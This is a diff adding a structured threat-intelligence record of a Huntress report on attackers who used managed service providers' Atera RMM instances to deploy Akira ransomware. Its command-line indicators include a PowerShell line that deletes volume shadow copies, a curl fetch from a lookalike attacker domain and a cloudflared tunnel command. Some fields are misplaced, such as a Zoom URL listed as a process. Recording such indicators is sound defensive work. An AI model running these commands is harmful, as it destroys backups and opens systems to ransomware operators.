@@ -1,0 +1,45 @@
+description: The report details multiple incidents where threat actors targeted Managed
+  Service Providers (MSPs) via their Atera RMM instances to compromise downstream
+  customers, ultimately deploying Akira ransomware. The attacks demonstrate consistent
+  tactics and indicators of compromise across different MSPs.
+attribution: Unknown
+malware_families:
+- Akira
+authors:
+- Huntress Security
+TTPs:
+  processes:
+  - cloudflared.exe
+  - explorer.exe
+  - AteraAgent.exe
+  - cmd.exe
+  - powershell.exe
+  - net.exe
+  - services.exe
+  - interactive.exe
+  - zoom.us/docs/sdk/native-sdks
+  commandline:
+  - C:\\Windows\\system32\\cloudflared.exe tunnel run --token [REDACTED]
+  - powershell.exe -Command Get-WmiObject Win32_Shadowcopy , Remove-WmiObject
+  - curl -L -k "https://support.us0Sweb-7o0m.biz/842799/check"
+  powershell:
+  - Get-WmiObject Win32_Shadowcopy , Remove-WmiObject
+  registry_keys: {}
+  image_load: {}
+  network_connections: {}
+  file_activity:
+  - C:\\ProgramData\\akira.ex_
+  persistence:
+  - Service (Own Process) - Cloudflared.exe
+  pipes: {}
+  process_relations:
+  - AteraAgent.exe -> cmd.exe -> powershell.exe -> net.exe
+IOCs:
+- 127.0.0.1
+- https://support.us0Sweb-7o0m.biz/842799/check
+- cloudflared.exe tunnel run --token [REDACTED]
+authors:
+- Huntress Adversary Tactics 
+reference: https://www.huntress.com/blog/rmm-gateway-for-bulk-attacks-on-msp-customers-part-2
+date_of_publication: July 18, 2025
+file_creation_date: July 18, 2025
